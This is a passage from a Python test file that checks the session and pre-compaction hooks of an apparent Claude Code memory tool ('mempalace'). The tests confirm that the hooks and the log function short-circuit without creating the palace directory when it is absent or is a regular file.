        )
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_hook_precompact_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_precompact(
            {"session_id": "absent", "transcript_path": str(transcript)},
            "claude-code",
        )
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_hook_session_start_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_session_start({"session_id": "absent"}, "claude-code")
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_log_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    _log("test message")
    assert not fake_root.exists()


def test_existing_dir_proceeds_normally(tmp_path, monkeypatch):
    """Regression: when PALACE_ROOT exists, hooks must proceed (no short-circuit)."""
    fake_root = tmp_path / "present-mempalace"
    fake_root.mkdir()
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)
    _log("test message")
    # _log should have created the state dir under the existing palace root
    assert (fake_root / "hook_state").exists()
    assert (fake_root / "hook_state" / "hook.log").is_file()


def test_regular_file_at_palace_root_treated_as_absent(tmp_path, monkeypatch):
    """A regular file at ~/.mempalace must be treated the same as absent.

    ``Path.exists()`` returns True for a regular file, which would let the
    kill-switch be bypassed and crash later when ``STATE_DIR.mkdir()`` runs
    on ``NotADirectoryError``. ``_palace_root_exists()`` must use
    ``is_dir()`` so a stray file (or broken symlink) short-circuits cleanly.
    """
    fake_root = tmp_path / "file-not-dir"
    fake_root.write_text("oops, this is a file not a directory")
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)

    # _palace_root_exists() is the source of truth — it must return False.
    assert hooks_cli_mod._palace_root_exists() is False

    # Hooks must short-circuit (return {} on stdout) and not touch disk.
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_session_start({"session_id": "file-at-root"}, "claude-code")
    assert json.loads(buf.getvalue() or "{}") == {}

    # _log must also short-circuit — it must NOT try to mkdir a path under a
    # regular file (which would raise NotADirectoryError).
    _log("test message")  # would raise if not short-circuited

    # The stray file is left untouched; we never try to convert it.
    assert fake_root.is_file()
    assert fake_root.read_text() == "oops, this is a file not a directory"
